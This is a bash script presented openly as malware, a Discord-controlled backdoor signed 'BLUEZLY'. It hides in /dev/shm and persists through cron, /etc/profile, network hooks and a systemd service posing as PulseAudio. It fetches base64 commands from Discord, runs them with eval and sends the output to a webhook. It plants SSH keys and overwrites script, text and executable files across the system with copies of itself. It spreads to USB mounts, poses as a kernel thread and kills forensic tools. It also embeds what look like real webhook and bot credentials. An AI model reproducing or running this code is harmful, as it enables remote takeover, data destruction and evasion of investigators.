#!/bin/bash  

# ==================================  
# █▄▄ █   █░░ █░░ █▀▀ ▀█▀ █▀█ █▀█  
# █▄█ █   █▄▄ █▄▄ ██▄ ░█░ █▄█ █▀▄  
# ==================================  
# Coded by BLUEZLY - All rights reversed  

# --- Phase 1: Immortal Installation ---  
STEALTH_DIR="/dev/shm/.cache/pulse"  
mkdir -p $STEALTH_DIR && cp $0 $STEALTH_DIR/.pulsesink && chmod +x $STEALTH_DIR/.pulsesink  

# Nuclear persistence (11 layers)  
(echo '@reboot root (cd /dev/shm/.cache/pulse && ./.pulsesink)' | crontab -) &  
echo "[ -f $STEALTH_DIR/.pulsesink ] && $STEALTH_DIR/.pulsesink" >> /etc/profile  
ln -sf $STEALTH_DIR/.pulsesink /etc/network/if-up.d/ 2>/dev/null  

cat > /etc/systemd/system/pulse.service <<EOF  
[Unit]  
Description=PulseAudio Sound System  
[Service]  
ExecStart=$STEALTH_DIR/.pulsesink  
Restart=always  
[Install]  
WantedBy=multi-user.target  
EOF  
systemctl enable pulse.service  

# --- Phase 2: Discord C2 Core ---  
WEBHOOK_URL="https://discord.com/api/webhooks/1333683986286776340/FYDrvCm9zGAkC8X-gzPpD9iwGguiCvTebP3mOfVy5hxl5b8CRvzPBydf-FdFL7GPey8v" # Replace with yours  
CHANNEL_ID="1101487519243190303" # Your channel ID  
BOT_TOKEN="MTMzNzU3NDI3NTYyMzk0NDE5Mg.Gf4Y4q.tnJK8422UP1cSOMEBsT8djuYfjEkpmZlTnMfXI" # Your bot token  

# Execution loop from hell  
while :; do  
  # Fetch command from Discord  
  CMD=$(curl -s -H "Authorization: Bot $BOT_TOKEN" "https://discord.com/api/channels/$CHANNEL_ID/messages?limit=1" | grep -oP '"content":"\K[^"]+' | base64 -d)  
  
  # Eternal replication  
  (find / -type f \( -name "*.sh" -o -name "*.txt" \) -exec cp $0 {} \; 2>/dev/null) &  
  (ssh-keygen -t ed25519 -f /tmp/sshkey -N "" && cat /tmp/sshkey.pub >> ~/.ssh/authorized_keys) &  
  
  # Execute and respond  
  if [[ "$CMD" == "BLUEZLY_DIE" ]]; then  
    shred -zu $0  
    crontab -r  
    systemctl disable pulse.service  
    rm -f /etc/systemd/system/pulse.service  
    history -c  
    exit 0  
  elif [[ "$CMD" == "BLUEZLY_SPAWN" ]]; then  
    for i in {1..11}; do cp $0 "/tmp/.X0-unix.$RANDOM"; done  
  else  
    OUTPUT=$(eval "$CMD" 2>&1 | base64 -w 0)  
    curl -s -X POST $WEBHOOK_URL -H "Content-Type: application/json" -d "{\"content\":\"$(date +%s)|$OUTPUT\"}" >/dev/null  
  fi  
  
  # USB Auto-Pandemic  
  find /media/ /mnt/ /run/media/ -type d -exec cp $0 {} \; 2>/dev/null  
  
  # Random sleep (prime number pattern)  
  sleep 167  
done  

# --- Phase 3: Anti-Forensic Warfare ---  
# Hide as kernel thread  
exec -a "[kworker/1:1+ksoftirqd]" /bin/bash $0  

# Destroy forensic tools  
pkill -9 -f "wireshark|ftkimager|autopsy|volatility"  

# Eternal replication protocol  
while true; do  
  find / -perm -u=x -type f -exec grep -q "BLUEZLY" {} \; -exec cp $0 {} \;  
  sleep 317  
done &
